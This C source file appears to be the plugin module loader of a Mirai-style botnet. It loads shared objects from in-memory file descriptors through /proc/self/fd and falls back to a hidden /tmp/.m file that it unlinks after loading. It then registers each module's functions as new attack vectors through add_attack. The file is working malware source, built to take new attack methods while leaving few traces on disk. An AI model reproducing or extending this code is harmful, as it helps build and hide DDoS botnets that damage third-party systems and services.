#define _GNU_SOURCE
#include "module.h"
#include "attack.h"
#include "util.h"
#include <dlfcn.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>

#ifndef __NR_memfd_create
#define __NR_memfd_create 319
#endif

struct module_entry {
    char name[MODULE_NAME_MAX];
    void *handle;
};

static struct module_entry modules[MODULES_MAX];
static int module_count = 0;

typedef void (*module_init_t)(void (*)(uint8_t, ATTACK_FUNC, const char *));

static void register_method(uint8_t vector, ATTACK_FUNC func, const char *name)
{
    add_attack(vector, func);
}

int module_load_fd(int fd, const char *name)
{
    if (module_count >= MODULES_MAX || fd < 0)
        return -1;

    lseek(fd, 0, SEEK_SET);

    char load_path[128];
    int plen;

    // try dlopen from /proc/self/fd/N first
    plen = util_strcpy(load_path, "/proc/self/fd/");
    {
        int n = fd, tmp = n, digits = 0;
        do { tmp /= 10; digits++; } while (tmp > 0);
        int i = digits;
        load_path[plen + i] = '\0';
        do {
            i--;
            load_path[plen + i] = '0' + (n % 10);
            n /= 10;
        } while (n > 0);
    }

    void *handle = dlopen(load_path, RTLD_NOW | RTLD_LOCAL);
    if (!handle) {
        // fallback: copy to /tmp/.m and dlopen from there
        char tmp_path[] = "/tmp/.m";
        int tmp_fd = open(tmp_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
        if (tmp_fd >= 0) {
            lseek(fd, 0, SEEK_SET);
            char buf[4096];
            int n;
            while ((n = read(fd, buf, sizeof(buf))) > 0)
                write(tmp_fd, buf, n);
            close(tmp_fd);
            handle = dlopen(tmp_path, RTLD_NOW | RTLD_LOCAL);
            unlink(tmp_path);
        }
        if (!handle)
            return -1;
    }

    module_init_t init = (module_init_t)dlsym(handle, "module_init");
    if (!init) {
        dlclose(handle);
        return -1;
    }

    struct module_entry *mod = &modules[module_count++];
    util_strcpy(mod->name, (char *)name);
    mod->handle = handle;

    init(register_method);

    return 0;
}

void module_unload(const char *name)
{
    for (int i = 0; i < module_count; i++) {
        if (util_strcmp(modules[i].name, (char *)name)) {
            dlclose(modules[i].handle);
            for (int j = i; j < module_count - 1; j++)
                modules[j] = modules[j + 1];
            module_count--;
            break;
        }
    }
}

void module_unload_all(void)
{
    while (module_count > 0) {
        module_count--;
        dlclose(modules[module_count].handle);
    }
}

int module_list(char *buf, int maxlen)
{
    if (maxlen <= 0)
        return 0;
    int off = 0;
    for (int i = 0; i < module_count && off < maxlen - 1; i++)
    {
        int nl = util_strlen(modules[i].name);
        int need = (off > 0) ? nl + 1 : nl;
        if (off + need >= maxlen)
            break;
        if (off > 0)
            buf[off++] = ',';
        util_memcpy(buf + off, modules[i].name, nl);
        off += nl;
    }
    buf[off] = '\0';
    return off;
}
